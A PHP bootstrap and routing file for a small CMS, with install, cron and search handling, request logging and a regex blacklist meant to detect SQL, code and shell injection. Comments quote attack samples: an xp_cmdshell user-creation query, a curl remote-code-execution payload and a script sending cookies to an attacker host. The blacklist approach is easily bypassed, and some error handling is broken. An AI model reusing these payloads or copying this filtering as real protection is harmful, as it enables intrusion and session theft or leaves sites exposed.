<?php
global $_DEBUG ;
global $_FOLLOW ;
$_DEBUG = file_exists('.offline');
$_FOLLOW = false;
global $_AUTOSITEVERSIONNR ;
$_AUTOSITEVERSIONNR = (float)5.52;
/*set_error_handler(function($_errno,$errstr){
   global $_FOLLOW;
   //print '<H1>ERROR8</H1>';
   if($_DEBUG){print $_errno.$errstr;}
   return true;
}
);

ini_set('track_errors', true);
*/
if($_DEBUG){ 
    ini_set('display_errors',1);
    ini_set('display_startup_errors',1);
    error_reporting(E_ALL|  E_ERROR | E_WARNING | E_PARSE| E_NOTICE);
}
spl_autoload_extensions('.php,.inc');
spl_autoload_register(function ($klasse) {
 try{
  $pad = getRealinstall();
  if(strpos($klasse,'\\')==0){   array_push($pad,'autosystem');
  }else{$klasse = str_replace('\\', DIRECTORY_SEPARATOR, $klasse);}
    array_push($pad,$klasse.'.inc');
    $pad = implode(DIRECTORY_SEPARATOR,$pad);
    if(file_exists($pad)&& is_readable($pad)){            require_once $pad;
    }
 }catch(Exception $e){
   global $_DEBUG;
   if($_DEBUG){\autosystem\DEBUG::printERR($e);}
 }
});
class Init{
    private $version = '5.52' ;
    private $overwritesearch = false;
    private $modulesecurityoverwrite =['ModerateEmails','Mysql'];
    protected $loc = 'start' ;
    protected $action = 'Install' ;
    private $iplockdir = './oncache/iplocks/';
    private $cashdir = './oncache/fullcash/';
    private $locale='en';
    private $protocol;
    function __construct(){
        if($this->isLOCK()){
            include('./errors/outofservice.html');
            die();
        }
        $this->protocol=current(explode('/',$_SERVER['SERVER_PROTOCOL']));
        $argv = func_get_args();
        try{
             if(key_exists('action',$_GET)&& $_GET['action']=='Install'&&key_exists('loc',$_GET)&& $_GET['loc']=='start'){
                 $this->locale = $argv[0];
                 self::__constructInstall();
                 return;
             }
             if(key_exists('search',$_GET)||key_exists('search',$_POST)||key_exists('q',$_GET)){
                 self::__constructSearch($argv);
                 return;
             }
             switch(func_num_args()){
                 case 0:     $this->loc='page';
                             $this->action='home';
                             self::__constructNormal();break;
                 case 1:     $this->locale = $argv[0];
                             self::__constructNormal();break;
                 case 3:     
                 case 4:     
                 if($argv[2]=='Crons'){
                    self::__constructCrons($argv[0],$argv[1],$argv[2],$argv[3]);
                 }
                 
             }
         }catch(Object $e){
            global $_DEBUG;
            if($_DEBUG){ print_r($e); }
            if (!isset($obj)){$obj->setInERROR('object',$e,$obj->getModelInfo());}
         }
         die();
    }
    public function __constructInstall($locale='en',$loc ='start',$action='Install'){
        try{
            $this->loc=$loc;
            $this->action=$action;
            $class = $this->getSelectClass(false);
            $obj = new $class($loc,$action,$locale,[]);
            $url = $this->loc.'/'.$this->action.'/';
            // && !is_file('./'.$this->version.'install.log')
            if($obj->canIDo($url)&&$this->CanInstall()){
                
                $obj->init();
            }else{
                print $obj->canIDo($url) .' '. $this->CanInstall();
                print 'can not install';
            }
        }catch(PDOException $e){
             global $_DEBUG;
             if($_DEBUG){\autosystem\DEBUG::printERR($e);}        
        }catch(Exception $e){
             global $_DEBUG;
             if($_DEBUG){\autosystem\DEBUG::printERR($e);}
        }catch(Object $e){
              print_r($e);
        }
    }
    public function __constructSearch($args){
        try{
           $aterm = isset($_GET['search'])?$_GET['search']:$_POST['search'];
           if(isset($_GET['q'])){                $aterm =$_GET['q'];         }
           if($this->iscrime([$_GET,$_POST])){
              header('HTTP/1.0 405 MMM No i can\'t let you do this.',true,405);
              $this->advancedlog();
              $this->loc='page';$this->action='HTTP403';
              self::__constructNormal();
              return;
           }
           if(\autosystem\ValidateAs::isTerm($aterm)){
                $term = new \search\Term_model();
                if(isset($_POST['find'])){
                    if(!$term->existTerm($this->locale,$aterm)){
                        $term->registrateTerm($this->locale, $aterm);
                        self::__constructNormal();
                        return;
                    }
                    $term->Seachedcount($this->locale,$aterm);
                    if(key_exists('action',$_GET)&& key_exists('loc',$_GET)){
                        if(!$term->hasModuleSearch($_GET['action'],$_GET['loc'])){
                            $this->redirect('search/ResultGenerator/');
                        }else{
                            $this->overwritesearch =true;
                        }
                        //$this->loc='search';$this->action='Find';
                    }
                    self::__constructNormal();
                    return;
                }else{
                    $terms =$term->Acomplete($aterm);
                    print json_encode($terms);return;
                }
            }else{
                $this->loc='search';
                $this->action='BadTherm';
                self::__constructNormal();
            }
        }catch(\PDOException $e){
             global $_DEBUG;
             if($_DEBUG){\autosystem\DEBUG::printERR($e);}        
        }
    }
    public function __constructCrons($locale,$loc ,$action,$key,$repetition='hour'){
       if(($loc.'/'.$action.'/')!='start/Crons/'){
          $this->logdata($data,'crons');  
          header('HTTP/1.0 405 MMM No i can\'t let you do this.',true,405);
          die();
       }
       //print 'start';
       $class = implode('\\', [$loc,$action]);
       $obj = new $class($loc,$action,$locale,$this->getSelectedmenu());
       if($obj->canIDo($key)){
            $obj->setrepetition($repetition);
            $obj->init();
       }else{
            die('general access denied');
       }
       $obj->__destruct();
       unset($obj);
       //print 'END <!--***MEM'.$this->convert(memory_get_usage(true)).':'.$this->convert(memory_get_usage()).'***-->';
    }
    public function __constructNormal(){
       try{
           $browser = new \autosystem\Browser();
           if($browser->isSignBlocked()){
                include('./errors/outofservice.html');
                die();
           }
           $class = $this->getSelectClass($this->isIPblocked($browser->getIp()));
           if(is_ClassExist($class)){//global function  
               if(isset($_GET['ToFavorites'])){
                    $obj = new $class('workspace','Favorites',$this->locale,$this->getSelectedmenu());
                    $obj->save_location($this->loc,$this->action,$_GET);
               }else{
                    $obj = new $class($this->loc,$this->action,$this->locale,$this->getSelectedmenu());
               }
           }else{
                $class = $this->getSelectClass(true);
                $obj = new $class($this->loc,$this->action,$this->locale,$this->getSelectedmenu());
           }
           if (!isset($obj)){
                include('./errors/outofservice.html');
                die('error');
           }
           $url = $this->loc.'/'.$this->action.'/';           
           if($obj->canIDEBUG()){
               global $_DEBUG ;
               $_DEBUG = true;
           }
           $obj->addProsessionInfo($this->loc,$this->action); 
           $obj->setLocation($_GET);
           if($obj->canIDo($url)||$url == 'users/Login/'||$url == 'users/Logout/'){
                $obj->init();  
           }else{
                if($url != 'users/Login/' && $url != 'start/Install/'){
                    //print$obj->getAccound_id().'-'.$obj->canIDo($url);
                    if($obj->getAccound_id()!=false && $obj->canIDo('start/Install/')){   $obj->redirect('start/Install/');
                    }else{
                        $obj->redirect('users/Login/'); 
                    }
                }else{  die('general access denied');
                }
           }
           $obj->__destruct();
       }catch(PDOException $e){
            //print '<H1>ERROR1</H1>';
                if (!isset($obj)&& is_object($obj)){$obj->setInERROR('pdo',$e,$obj->getModelInfo());}  
                      
       }catch(Exception $e){
            //print '<H1>ERROR2</H1>';
                if (!isset($obj)){
                    $obj->setInERROR('exception',$e,$obj->getModelInfo());
                }else{
                    global $_DEBUG;
                    if($_DEBUG){\autosystem\DEBUG::printERR($e);}  
                }
       }catch(Object $e){
            //print '<H1>ERROR3</H1>';
            if (!isset($obj)){$obj->setInERROR('object',$e,$obj->getModelInfo());}
            
            print_r($e);
       }
       unset($obj);
       //print '<!--***MEM'.$this->convert(memory_get_usage(true)).':'.$this->convert(memory_get_usage()).'***-->';
    }
    public function __constructTest($key){
       try{
        $class = [];
       if(!empty($this->loc)){array_push($class,$this->loc);}
       if(!empty($this->action)){array_push($class,$this->action);}
       $class = implode('\\', $class);
           print $class;
           if(is_ClassExist($class)){
                $obj = new $class($this->loc,$this->action,$this->locale,$this->getSelectedmenu());
           }else{
                $class = $this->getSelectClass(true);
                $obj = new $class($this->loc,$this->action,$this->locale,$this->getSelectedmenu());
           }
           if (!isset($obj)){ die('error');}     
           if($obj->canIDEBUG()){
               global $_DEBUG ;
               $_DEBUG = true;
           } 
          $obj->runtest();
          $obj->__destruct();
       }catch(PDOException $e){
            //print '<H1>ERROR1</H1>';
                if (!isset($obj)&& is_object($obj)){$obj->setInERROR('pdo',$e,$obj->getModelInfo());}  
                      
       }catch(Exception $e){
            //print '<H1>ERROR2</H1>';
                if (!isset($obj)){
                    $obj->setInERROR('exception',$e,$obj->getModelInfo());
                }else{
                    global $_DEBUG;
                    if($_DEBUG){\autosystem\DEBUG::printERR($e);}  
                }
       }catch(Object $e){
            //print '<H1>ERROR3</H1>';
            if (!isset($obj)){$obj->setInERROR('object',$e,$obj->getModelInfo());}
            
            print_r($e);
       }
       unset($obj);
       //print '<!--***MEM'.$this->convert(memory_get_usage(true)).':'.$this->convert(memory_get_usage()).'***-->';
    }
    private function convert($size){   
        $unit=array('b','kb','mb','gb','tb','pb');
        return @round($size/pow(1024,($i=floor(log($size,1024)))),2).' '.$unit[$i];
    }
    private function iscrime($asoarr){
       $return = false;
       $arrA = $this->getinjectionsA();
       $arrB = $this->getinjectionsB();
       $arrC = $this->getinjectionsC();
       $arrD = $this->getinjectionsD();
       $arrF = $this->getinjectionsF();
       foreach($asoarr as $rangetocheck){
          if(key_exists('page',$rangetocheck)&& !is_numeric($rangetocheck['page'])){
            $return = true;    @trigger_error(__FILE__.':'.__LINE__.'Injection page', E_USER_WARNING);
          }  
          foreach($rangetocheck as $key => $value){  
              if ($value === true || $value === false) continue;
              if (is_numeric($value)) continue;
              if($this->checkCrime($value,'(',$arrA)){     $return = true;    @trigger_error(__FILE__.':'.__LINE__.'Injection selection A"("!', E_USER_WARNING);                
              }
              if($this->checkCrime($value,'=',$arrB)){     $return = true;    @trigger_error(__FILE__.':'.__LINE__.'Injection selection B"="!', E_USER_WARNING);
              }
              if($this->checkCrime($value,' ',$arrF)){     $return = true;    @trigger_error(__FILE__.':'.__LINE__.'Injection selection F" "!', E_USER_WARNING);
              }
              if($this->checkCrime($value,'?',$arrD)){     $return = true;    @trigger_error(__FILE__.':'.__LINE__.'Injection selection D" "!', E_USER_WARNING);
              }
              if($this->checkCrime($value,'?',$arrD)){     $return = true;    @trigger_error(__FILE__.':'.__LINE__.'Injection selection D" "!', E_USER_WARNING);
              }
          }
       } 
       return $return  ;
    }
    private function checkCrime($val, $char,$colection){
        if(!is_array($val)&& strpos($val,$char)){
            foreach($colection as $rull){
                if(preg_match($rull,$val)){
                    return true;
                }
            }
        }
        return false;
    }
    private function isIPblocked($ip){
        if(file_exists($this->iplockdir.substr($ip, 0, 4))){    return true;        }
        if(file_exists($this->iplockdir.$ip)){                  return true;        }
        return false;
    }
    private function getinjectionsA(){       return['/CONCAT\(0x71787a7a71/i','/EXTRACTVALUE\(/i','/make_set\(/i','/randomblob\(/i','/select \(/i','/select count\(/i','/group_concat\(/i','/benchmark\(/i','/CASE WHEN \(/i','/\' or \(/i','/md5\(now\(\)\)/i','/sleep\(/i','/PG_SLEEP\(/i','/\)\=\(select*/i','/\(select\(1/i','/name_const\(/i','/CHAR\(/i','/unhex\(hex/i','/DATABASE\(\)\,VERSION\(\)/i','/cmdshell\(/i','/RECEIVE_MESSAGE\(/i'];
    }
    private function getinjectionsB(){       return['/\" and \"x\"\=\"/i', '/\'A\=0/i','/and 1\=1/i','/ and \'x\'\=\'x/i','/\'\\=\\\'/','/ and \'%\'\=/i'];
    }
    private function getinjectionsC(){       return['/http\:/i','/https\:/i','/ftp\:/i','/sftp\:/i','/([0-9]{3}.){4}\:/i'];
    }
    /*
     https://cwe.mitre.org/data/definitions/96.html
    */
    private function getinjectionsD(){       return['/\<\?php/i','/\<\?=/i','/bin/ls'];// 'function &'
    }//'phpinfo','shell_exec',
    //$query  = "SELECT * FROM products WHERE id LIKE '%a%' exec master..xp_cmdshell 'net user test testpass /ADD'--";
    private function getinjectionsF(){       return['/DROP TABLE/i','/UNION SELECT/i','/UNION ALL/i','/ information_schema/i','/ waitfor delay /i','/ls -/i'];//
    }//'union','select','into','where','update ','from''killall','set ','proc_close','proc_get_status',
    //'fopen','fwrite',
    //curl -s "https://domain.tld/script.php" --data "contactEmail=rce@zerodays.lol&createTables=2&mainLanguage=RCE&salt=';eval(\$_REQUEST['zerodayslol']);echo '&systemAdminPass=zerodays.LOL&systemRootPath=./&webSiteRootURL=<URL>&webSiteTitle=Zerodays.lol&databaseHost=<DB_HOST>&databaseName=<DB_NAME>&databasePass=<DB_PASS>&databasePort=<DB_PORT>&databaseUser=<DB_USER>"
    private function getinjectionsL(){
        // 'escapeshellarg','exec','escapeshellcmd','ssh','cmd','mv','locate','curl'
        // '/*','chmod','chdir','passthru','proc_nice','proc_open','proc_terminate','system','telnet','passwd','kill','script','bash','perl','mysql','~root','.history','~nobody','getenv'
    }
    private function unconstructinjections(){
        //" and "
        /*
        <script>
new Image().src="http://attacker.hak/catch.php?cookie="+encodeURI(document.cookie);
</script>
        */
    }
    private function redirect($url){//redirect for no objects
        if (!headers_sent()){
		    $len= strripos($_SERVER['PHP_SELF'],'/');
			header('Location: '.$this->protocol.$_SERVER['SERVER_NAME'].htmlspecialchars(substr($_SERVER['PHP_SELF'],0,$len)).'/'.$url);
            die('GOTO '.$this->protocol.$_SERVER['SERVER_NAME'].htmlspecialchars(substr($_SERVER['PHP_SELF'],0,$len)).'/'.$url);
		}else {
			die('<a href="'.$this->protocol.htmlspecialchars($_SERVER['SERVER_NAME']).'/'.$url.'" >here the link</a>');
		}
    }
    private function getSelectedmenu(){
        if(isset($_GET['setMenu'])){
            return [filter_input(INPUT_GET,'setMenu')];
        }
        return [''];
    }
    private function getSelectClass($cantdo=false){
       $class = [];
       if($this->overwritesearch){
          $this->loc='search';
          $this->action='Find'; 
       }else{ 
          $this->loc = (isset($_GET['loc']))?filter_input(INPUT_GET,'loc'):'';
          $this->action = (isset($_GET['action']))?filter_input(INPUT_GET,'action'):'';
       }
       if($this->iscrime([$_GET,$_POST])||$cantdo){
          if(!in_array($this->action,$this->modulesecurityoverwrite)){
                header('HTTP/1.0 405 MMM No i can\'t let you do this.',true,405);
                $this->advancedlog();
                return 'page\\HTTP403';  
          }          
       }else{          $this->simplelog();       }
       if($this->loc ==''|| $this->action==''){
            $this->loc ='page';$this->action='Watch';
       }
       if(!empty($this->loc)){array_push($class,$this->loc);}
       if(!empty($this->action)){array_push($class,$this->action);}
       $class = implode('\\', $class);
       return $class;
    }
    private function search(){   }
    private function isLOCK(){            return file_exists('.lock');          }
    private function CanInstall(){        return !file_exists('.noinstall');    }
    private function inIPrange($ip){      return file_exists('.lock');          }
        
    private function advancedlog(){
        $datatosave['remoteIp'] = (key_exists('REMOTE_ADDR',$_SERVER)&&\autosystem\ValidateAs::isIP4($_SERVER['REMOTE_ADDR']))?'remoteIp'.$_SERVER['REMOTE_ADDR']:'remoteIp'.$_SERVER['REMOTE_ADDR'];
        $datatosave['user'] = (key_exists('PHP_AUTH_USER',$_SERVER))?'user:'.$_SERVER['PHP_AUTH_USER']:'';
        $datatosave['timestamp'] = time();
        $datatosave['date'] = date('l j F Y');
        $datatosave['referender'] =(key_exists('HTTP_REFERER',$_SERVER))?'ref'.$_SERVER['HTTP_REFERER']:'';   
        $datatosave['host'] = 'host'.$_SERVER['HTTP_HOST'];
        $datatosave['auth'] = (key_exists('PHP_AUTH_USER',$_SERVER))?'auth'.$_SERVER['PHP_AUTH_USER']:'';
        foreach($_GET as $k =>$v){      $datatosave['GET:'.$k]= '['.$k.','.(!is_array($v)?$v:print_r($v,true)).']';
        }
        foreach($_POST as $k =>$v){     $datatosave['POST:'.$k]= '['.$k.','.(!is_array($v)?$v:print_r($v,true)).']';
        }
        foreach($_COOKIE as $k =>$v){   $datatosave['cookie:'.$k]= '['.$k.','.(!is_array($v)?$v:print_r($v,true)).']';
        }
        $this->logdata($datatosave ,'GET_E_POST_advanced');
           $us=\autosystem\DBConn::getTableNameFor('user_stats');
           $database = \autosystem\DBConn::GET();
           $sql = ' SELECT id FROM '.$us.' WHERE YEAR(`date`)=:year AND MONTH(`date`)=:month AND DAY(`date`) =:day';
           $dbStmt = $database->prepare($sql);
           $dbStmt->execute([':year'=>date('Y'),':month'=>date('m'),':day'=>date('d')]);
           $row = $dbStmt->fetch(\PDO::FETCH_ASSOC);
           if(isset($row)&& is_array($row) && @key_exists('id',$row)){
               $sql = 'UPDATE '.$us.'  SET `crimes` = `crimes` + 1  WHERE id=:id';
               $dbStmt = $database->prepare($sql);
               $dbStmt->execute([':id'=>$row['id']]);
           }else{
               $sql = 'INSERT INTO '.$us.' (`id`,`date`,`crimes`)VALUES(NULL,\''.date('Y-m-d').'\',1)';
               $dbStmt = $database->prepare($sql);
               $dbStmt->execute();
           }
           @$dbStmt->closeCursor();
    }
    private function logTerm(){
    }
    private function OverRullLog(){
        $this->advancedlog();
        
    }
    private function simplelog(){
        $datatosave['remoteIp'] = $_SERVER['HTTP_USER_AGENT'];
        $datatosave['remoteIp'] = 'remotIp'.$_SERVER['REMOTE_ADDR'];
        $datatosave['timestamp'] = time();
        $datatosave['date'] = date('l j F Y');   
        $datatosave['host'] = 'host'.$_SERVER['HTTP_HOST'];
        //$datatosave["auth"] = "auth".$_SERVER["PHP_AUTH_USER"];
        foreach($_GET as $k =>$v){
            $datatosave['GET:'.$k]= '['.$k.','.(!is_array($v)?$v:print_r($v,true)).']';
        }
        foreach($_POST as $k =>$v){
            $datatosave['POST:'.$k]= '['.$k.','.(!is_array($v)?$v:print_r($v,true)).']';
        }
        $this->logdata($datatosave ,'GET_E_POST_basic');
    }
    private function logdata($data,$fname){
        $logfile = new \autosystem\LogFile('./log/',$fname.'.log');
        $logfile->save_line($data);
    }
}
//TODO check if you need it
/**
class Autosite_Autoloader{
    public static function Register() {
        if (function_exists('__autoload')) {   spl_autoload_register('__autoload');}
        return spl_autoload_register(array('Autosite_Autoloader', 'Load'));
    }
    public static function Load($pClassName){
        try{
            $pad = ['includes'];
            if(strpos($klasse,'\\')==0){   array_push($pad,'autosystem');
            }else{$klasse = str_replace('\\', DIRECTORY_SEPARATOR, $klasse);}
            array_push($pad,$klasse.'.inc');
            $pad = implode(DIRECTORY_SEPARATOR,$pad);
            if(file_exists($pad)&& is_readable($pad)){            require_once $pad;
            }
        }catch(Exception $e){
            global $_DEBUG;
            if($_DEBUG){\autosystem\DEBUG::printERR($e);}
        }
    }
}
//*/
function is_ClassExist($klasse=''){
    global $_FOLLOW;
    if($_FOLLOW){        print $klasse.'<br>';    }
    $pad = getRealinstall();
    if(strpos($klasse,'\\')==0){   array_push($pad,'autosystem');
    }else{                         $klasse = str_replace('\\', DIRECTORY_SEPARATOR, $klasse);
    }
    array_push($pad,$klasse.'.inc');
    $pad = implode(DIRECTORY_SEPARATOR,$pad);
    return (file_exists($pad)&& is_readable($pad))? $pad :false;
}
function getRealinstall($check=false){//location to include more sites on one installation place only settingfiles .ini.php
    if($check){
        
    }
    if(file_exists('.onlineremote')){        return ['..','includes'];    }
    if(file_exists('.offlineremote')){       return ['..','5.0','includes'];    }
    if(file_exists('.online')){              return ['.','djdb','includes'];    }
    if(file_exists('.onlineup54')){          return ['.','djdb','includes54'];    }
    if(file_exists('.offline')){
        //return ['includes'];
    }
    return ['.','includes'];
}
function getAutositePath($arrsubloc){
    $arr = getRealinstall();
    $arr = array_merge($arr,$arrsubloc);
    return implode(DIRECTORY_SEPARATOR,$arr).'';
}
function is_ViewExist($view=''){
    global $_FOLLOW;
    if($_FOLLOW){        print 'view: '. $view.((file_exists($view)&& is_readable($view))?' exist':' notexist');    }
    return(file_exists($view)&& is_readable($view));
}
?>